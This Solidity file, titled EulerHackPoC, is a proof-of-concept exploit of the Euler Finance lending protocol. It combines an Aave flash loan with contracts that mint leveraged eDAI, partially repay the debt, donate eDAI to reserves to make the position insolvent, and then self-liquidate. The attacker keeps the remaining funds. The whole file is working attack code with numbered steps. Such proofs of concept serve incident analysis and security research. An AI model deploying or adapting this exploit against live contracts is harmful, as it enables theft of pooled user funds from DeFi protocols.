// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import {IPool} from "@aave/v3/interfaces/IPool.sol";
import {FlashLoanSimpleReceiverBase} from "@aave/v3/flashloan/base/FlashLoanSimpleReceiverBase.sol";
import {IERC20} from "@aave/v3/dependencies/openzeppelin/contracts/IERC20.sol";
import {IPoolAddressesProvider} from "@aave/v3/interfaces/IPoolAddressesProvider.sol";
import {EToken} from "euler-contracts/modules/EToken.sol";
import {DToken} from "euler-contracts/modules/DToken.sol";
import {Euler} from "euler-contracts/Euler.sol";
import {Liquidation} from "euler-contracts/modules/Liquidation.sol";
import {Addresses} from "./libraries/Addresses.sol";

error NotEnoughFunds(uint256 balance, uint256 amount);
error NotProfitable(uint256 eTokenBalance, uint256 dTokenBalance);

contract EulerHackPoC is FlashLoanSimpleReceiverBase {

    Violator private violator;

     constructor(
        IPoolAddressesProvider _addressProvider
    ) FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider)) {
         violator = new Violator();
     }

    // 1. call flahsloan on AaveV3
    function callFashLoan(address _tokenAddress, uint256 _amount) external {
       POOL.flashLoanSimple(address(this), _tokenAddress, _amount, "0x", 0);
    }

    // flashLoanSimple callback
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address,
        bytes calldata
    )
        external
        returns (bool)
    {
        IERC20 token = IERC20(asset);
        // 2. Transfer the full loan balance to the violator contract
        token.transfer(address(violator), amount);

        // Start the attack using 2/3 of the funds
        uint256 attackAmount = amount / 3 * 2;

        // Call violator and execute attack
        violator.executeAttack(token, attackAmount);

        uint256 balance = token.balanceOf(address(this));
        uint256 repayAmount = amount + premium;

        // Check if we have enough funds to repay the loan
        if(balance < repayAmount) {
            revert NotEnoughFunds({
                balance: balance,
                amount: repayAmount
            });
        }

        // Approve the Pool contract allowance to pull the owed amount
        token.approve(address(POOL), repayAmount);

        return true;
    }

    receive() external payable {}

}

contract Violator {
    Liquidator private liquidator;

    constructor() {
        liquidator = new Liquidator();
    }

    function executeAttack(IERC20 _token, uint256 _amount) external {
        // Check DAI balance
        uint256 balance = _token.balanceOf(address(this));

        // The minBalance is set to 150% of the given _amount.
        // - 2/3 of the _amount is used for leveraging the position.
        // - 1/3 of the _amount is used to decrease the dToken balance, effectively repaying part of the debt.
        uint256 minBalance = _amount * 3 / 2;

        // Check if we have enough funds to execute the attack
        if(balance < minBalance) {
            revert NotEnoughFunds({
                balance: balance,
                amount: minBalance
            });
        }

        // Approve Euler contract
        _token.approve(Addresses.EULER, minBalance);

        EToken eToken = EToken(Addresses.eDAI);

        //3. Deposit 2/3 to eDAI
        eToken.deposit(0, _amount);

        // 4. Create a 10x artificial eDAI leverage

        uint256 amountLeveraged = _amount * 10;
        eToken.mint(0, amountLeveraged);

        DToken dToken = DToken(Addresses.dDAI);

        // 5. Repay half of the DAI violator’s position, causing dDAI balance to decrease
        dToken.repay(0, _amount / 2);

        // 6. Create another 10x artificial eDAI leverage
        eToken.mint(0, amountLeveraged);

        // 7. Donate half of eDAI leveraged balance to the reserve of the eDAI
        eToken.donateToReserves(0, amountLeveraged / 2);

        uint256 eTokenBalance = eToken.balanceOfUnderlying(address(this));
        uint256 dTokenBalance = dToken.balanceOf(address(this));

        // Violator should contain a significantly larger amount of dDAI than eDAI that will never be collateralized
        if(dTokenBalance < eTokenBalance) {
            revert NotProfitable({
                eTokenBalance: eTokenBalance,
                dTokenBalance: dTokenBalance
                });
        }

        return liquidator.executeLiquidation(msg.sender,  address(this), _token);
    }
}


contract Liquidator {
    Liquidation public constant liquidation = Liquidation(Addresses.LIQUIDATION);

    function executeLiquidation(address _attacker, address _violator, IERC20 _token) external {
        // 8. Liquidate the violator’s position
        Liquidation.LiquidationOpportunity memory liq =  liquidation.checkLiquidation(address(this), _violator, address(_token), address(_token));
        liquidation.liquidate(_violator, address(_token), address(_token), liq.repay, liq.yield-1);

        // Withdraw all funds from Euler
        EToken(Addresses.eDAI).withdraw(0, _token.balanceOf(Addresses.EULER));

        // Transfer all funds to the EulerHackPoC contract to repay the loan and keep the profit
        _token.transfer(_attacker, _token.balanceOf(address(this)));
    }

}
